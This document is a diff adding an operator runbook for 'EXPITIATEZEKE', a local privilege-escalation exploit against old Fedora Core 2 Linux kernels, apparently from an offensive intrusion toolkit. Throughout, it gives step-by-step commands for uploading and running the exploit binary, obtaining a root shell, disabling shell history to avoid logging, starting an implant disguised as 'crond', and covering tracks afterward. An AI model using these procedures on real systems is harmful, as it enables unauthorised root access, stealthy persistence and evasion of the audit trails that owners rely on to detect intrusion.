@@ -1,0 +1,154 @@
+#############################
+### EXPITIATEZEKE
+#############################
+
+### local exploit against the Linux 2.6.5 - 2.6.6 Fedora Core 2 kernel. 
+
+### EXPITIATEZEKE takes advantage of the chown vulnerability which allows 
+### you change the gid on any file on the system to the current users gid. 
+
+### This exploit is packaged into a single executable that when run 
+### will create a temporary file (shell spawning program), change the 
+### group owner of the device file of the partition that the temp file 
+### resides on (i.e. If the temp file was /tmp/file12345678 and /tmp was 
+### mounted on /dev/hdb3 then the device file /dev/hdb3 would have its 
+### group ownership changed.)
+### After this takes place a cache flushing procedure occurs syncing the 
+### running filesystem with the contents of the disk. 
+### Once this finishes and if successful, a root shell is returned to the operator.
+
+### OPSEC: vulnerability - public
+
+### NOTE: This will cause a temporary CPU spike during execution; care should be taken 
+### 	  to determine the risk if there are active users on the target
+
+
+
+
+###
+### Get a "before" picture of the device where /tmp resides
+###
+
+# find the device that is mounted on /tmp (ex.- /dev/hdb3) and make note;
+# if /tmp does not have its own filesystem, use the device of "/"
+
+df -k
+
+# look at the perms of the DEVICE, then make note of the group id; typically should be "disk"
+# ex: -ls /dev/hdb3
+
+-ls <DEVICENAME>
+
+# correlate the groupid to a digit by finding it in /etc/group, then save the numeric value
+# ex: -grep disk /etc/group
+
+-grep <GROUPNAME> /etc/group
+
+
+
+
+
+###
+### upload and execute
+###
+
+-put /current/up/exze exze
+
+# run the script (within nopen, use -shell)
+-shell
+./exze
+
+### A status code will show up while the program is running.  
+### The following value should indicate potential success:  0x000 <gid on device file>
+### The <gid> should be the same as you found out from the initial checks
+### MAKE NOTE OF THE VALUE REPORTED BACK ON THIS INITIAL ATTEMPT IN CASE OF FAILURE!!!
+
+### Any value other than 0x000 is an error code (see other documentation)
+### Wait about 5 minutes (for the cache flushing) and you should get a root prompt, then:
+
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+id
+
+# start a new noserver
+PATH=. crond
+
+
+
+
+
+
+###
+### IF AT FIRST YOU DON'T SUCCEED....... try, try..... the following in order:
+###
+
+### If you received an error that permissions didn't change, you may try again.
+### Next, try using the -r option. This option will prevent the temporary shell 
+### file from being removed if there is an error so that the operator will have a chance 
+### to do the cache flushing manually.
+
+-shell
+./exze -r
+
+### if successful, run the "unset"s from above - you have root and can cleanup
+
+### If the 'permissions didn't change' error still happens, the flushing procedure 
+### will need to be performed manually before proceeding to the next step. 
+
+find / -type f -exec cat {} \; > /dev/null
+
+### ONLY AFTER the 'find' completes, check the permissions of the shell file in /tmp:
+### should be rws--x--- and owned by root
+### 	DO NOT EXECUTE, OPEN, READ, OR WRITE TO THE SHELL FILE BEFORE THE EXPLOIT FINISHES 
+### AS IT MIGHT UNDO THE CHANGES MADE TO THE DISK!! THIS MEANS DO NOT DO AN LS
+### ON THE FILE OR TOUCH IT IN ANY MANNER UNTIL THE EXPLOIT COMPLETES.
+
+-lt /tmp
+
+### if the permissions have changed, then manually attempt to get a root shell; 
+### the -d and -i options will attempt to perform the cleanup of the shell file in /tmp 
+### and reset the group perms of the DEVICE 
+
+-lt /tmp
+-shell
+/tmp/file<######> -d <DEVICE> -i <GID>
+
+### if you don't get root by now, you probably won't
+
+
+###
+### CLEANUP
+###
+
+### no cleanup if successful the first time, however....
+
+### there may be cleanup involved under the following conditions:
+###	the exploit did NOT work on the first attempt
+### 	the exploit was aborted
+###	the connection to target was dropped
+
+### check the group id of the DEVICE where /tmp resides;
+### if the group is not the same as it was originally, set it to  
+### the gid echoed back in your INITIAL ATTEMPT (digit following 0x000)
+
+
+### NOTE: if you didn't get root, you may not be able to chgrp the device
+### 	but hopefully, the exploit will have set it to gid '0' to be
+### 	less conspicuous than that of your user's gid
+
+-lt /dev/<DEVICENAME>
+chgrp <GID> /dev/<DEVICENAME>
+-lt /dev
+
+
+# the shell file (/tmp/file######) may need to be cleaned up on target:
+-lt /tmp
+-rm /tmp/file*
+
+
+# remove the binary from /tmp
+-rm exze
+
+
+
